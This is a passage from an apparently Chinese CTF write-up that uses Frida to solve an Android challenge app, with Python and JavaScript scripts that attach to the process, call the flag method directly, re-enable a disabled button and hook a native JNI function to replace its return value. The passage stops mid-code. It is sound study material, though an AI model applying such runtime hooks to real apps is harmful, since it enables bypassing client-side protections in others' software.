class="hljs-string">&quot;android.hardware.memtrack@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1563</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.power@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1564</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.usb@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1565</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.wifi@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1566</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;local_opengl&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1567</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;local_gps&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1568</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;vinput&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1569</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;audioserver&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1570</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;lmkd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1571</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;surfaceflinger&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1572</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;thermalserviced&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1573</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;adbd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1574</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;noxd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1576</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;sh&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1582</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;cameraserver&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1583</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;drmserver&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1584</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;incidentd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1585</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;installd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1586</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;keystore&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1587</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;mediadrmserver&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1588</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;media.extractor&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1589</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;media.metrics&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1590</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;mediaserver&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1591</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;statsd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1592</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;storaged&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1593</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;wificond&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1594</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;media.codec&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1595</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;rild&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1596</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;gatekeeperd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1597</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;tombstoned&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1601</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;mdnsd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1618</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;iptables-restore&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1619</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;ip6tables-restore&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1714</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;system_server&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1856</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;sdcard&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1870</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.systemui&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1907</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;webview_zygote&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1974</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.phone&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1984</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;wpa_supplicant&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2001</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;设置&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2058</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.ext.services&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2267</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.process.media&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2282</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.vphone.launcher&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2291</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.printspooler&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2334</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.keychain&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2459</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.packageinstaller&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2478</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.providers.calendar&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2509</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.traceur&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2525</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.google.android.webview:webview_service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2547</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.google.android.webview:sandboxed_process0&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2597</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;com.android.inputservice&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2684</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.camera.provider@2.4-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2752</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;su&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">2862</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;CTF_100&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">3055</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;sh&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">3058</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;frida-server-16.1.8-android-x86_64&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">3060</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;logcat&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">3074</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;memfd:frida-helper-32 (deleted)&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>或者使用<code>frida-ps -U</code>，如果是一些中文名称的name，还可以使用<code>frida-ps -U -a</code>获取Identifier</p><p>然后就可以编写Python脚本将js代码注入，选择寻找MainActivity的实例，然后调用实例方法打印返回值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &quot;</span> + <span class="hljs-built_in">str</span>(message))<br> <br> <br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function x() &#123;</span><br><span class="hljs-string">    Java.choose(&#x27;com.ctf.test.ctf_100.MainActivity&#x27;, &#123;</span><br><span class="hljs-string">        onMatch: function (instance) &#123;</span><br><span class="hljs-string">            console.log(instance.get_flag(507904));</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        onComplete: function () &#123;</span><br><span class="hljs-string">            console.log(&#x27;Done&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>process = frida.get_usb_device(-<span class="hljs-number">1</span>).attach(<span class="hljs-string">&#x27;CTF_100&#x27;</span>)<br>script = process.create_script(jscode)<br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running CTF&#x27;</span>)<br>script.load()<br></code></pre></td></tr></table></figure><p>我们就可以在控制台看到如下结果：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">[*] Running CTF<br><span class="hljs-number">268796</span><span class="hljs-keyword">A</span><span class="hljs-number">5E68A25A1</span><br>Done<br></code></pre></td></tr></table></figure><p>Flag就是<code>268796A5E68A25A1</code>。</p><p>不过这个get_flag的本地方法貌似不会校验传入的参数具体数值，换几个数字都可以拿到Flag，因此我们也可以使用另一种思路，就是直接将button2设置为可以点击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &quot;</span> + <span class="hljs-built_in">str</span>(message))<br> <br> <br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function x() &#123;</span><br><span class="hljs-string">    Java.choose(&#x27;com.ctf.test.ctf_100.MainActivity&#x27;, &#123;</span><br><span class="hljs-string">        onMatch: function (instance) &#123;</span><br><span class="hljs-string">            instance.findViewById(0x7f0c0056).setClickable(true);</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        onComplete: function () &#123;</span><br><span class="hljs-string">            console.log(&#x27;Done&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>process = frida.get_usb_device(-<span class="hljs-number">1</span>).attach(<span class="hljs-string">&#x27;CTF_100&#x27;</span>)<br>script = process.create_script(jscode)<br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running CTF&#x27;</span>)<br>script.load()<br></code></pre></td></tr></table></figure><p>其中<code>0x7f0c0056</code>就是<code>R.id.button2</code>的实际值。运行上面的脚本，然后点击看FLAG的按钮就可以展示出Flag。</p><p><img src="/images/image-20231202151233597.png"></p><h3 id="Hook-native函数"><a href="#Hook-native函数" class="headerlink" title="Hook native函数"></a>Hook native函数</h3><p>假设我们有个需求，修改get_flag()函数的返回值，在native函数上挂钩子应该怎么处理呢？</p><h4 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h4><p>如果是JNI<strong>非动态注册</strong>，参考官方文档和一些博客很容易可以写出如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*****[frida hook]***** : &quot;</span> + <span class="hljs-built_in">str</span>(message))<br> <br> <br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function x() &#123;</span><br><span class="hljs-string">    //下面这代码是指定要Hook的so文件名和要Hook的函数名</span><br><span class="hljs-string">    var func_addr = Module.findExportByName(&quot;libctf.so&quot;,&quot;xxxx_get_flag&quot;);</span><br><span class="hljs-string">    send(&quot;func_addr=&quot;+func_addr);</span><br><span class="hljs-string">    Interceptor.attach(func_addr, &#123;</span><br><span class="hljs-string">        //onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span><br><span class="hljs-string">        onEnter: function(args) &#123;</span><br><span class="hljs-string">            send(&quot;Hook start&quot;);</span><br><span class="hljs-string">            send(&quot;args[2]=&quot; + args[2]); //打印我们java层第一个传入的参数</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        onLeave: function(retval)&#123; //onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值</span><br><span class="hljs-string">            send(&quot;return:&quot;+retval); //打印返回值</span><br><span class="hljs-string">            var env = Java.vm.getEnv(); //获取env对象，也就是native函数的第一个参数</span><br><span class="hljs-string">            var jstrings = env.newStringUtf(&quot;test&quot;); //因为返回的是字符串指针，使用我们需要构造一个newStringUtf对象，用来代替这个指针</span><br><span class="hljs-string">            retval.replace(jstrings); //替换返回值</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>process = frida.get_usb_device(-<span class="hljs-number">1</span>).attach(<span class="hljs-string">&#x27;CTF_100&#x27;</span>)<br>script = process.create_script(jscode)<br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running CTF&#x27;</span>)<br>script.load()<br></code></pre></td></tr></table></figure><h4 id="正式开始分析"><a href="#正式开始分析" class="headerlink" title="正式开始分析"></a>正式开始分析</h4><p>IDA分析之后查看导出表可以看出，其实libctf.so是动态JNI注册：<a href="https://zhuanlan.kanxue.com/article-4482.htm">JNI与动态注册介绍</a></p><p><img src="/images/image-20231203180648754.png"></p><p>先寻找so的地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> base_hello_jni = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libctf.so&quot;</span>);<br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;base_hello_jni=&quot;</span>+base_hello_jni);<br></code></pre></td></tr></table></figure><p>发现so的地址是null，然后我们打印出所有的so：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> modules = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateModulesSync</span>();<br>modules.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Name:&quot;</span>, <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Base:&quot;</span>, <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Size:&quot;</span>, <span class="hljs-variable language_">module</span>.<span class="hljs-property">size</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>发现确实没有libctf.so，但是在我们在源代码反编译后的lib文件夹下确实只有libctf.so一个动态链接库。</p><p>尝试手工加载so：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">load</span>(<span class="hljs-string">&quot;/data/data/com.ctf.test.ctf_100/lib/libctf.so&quot;</span>);<br><span class="hljs-title class_">Error</span>: dlopen <span class="hljs-attr">failed</span>: <span class="hljs-string">&quot;/data/app/com.ctf.test.ctf_100-DKPwuW3kmtpG18W0MdAxmA==/lib/arm/libctf.so&quot;</span> has unexpected <span class="hljs-attr">e_machine</span>: <span class="hljs-number">40</span> (<span class="hljs-variable constant_">EM_ARM</span>)<br>    at value (frida/runtime/core.<span class="hljs-property">js</span>:<span class="hljs-number">234</span>)<br>    at &lt;<span class="hljs-built_in">eval</span>&gt; (&lt;input&gt;:<span 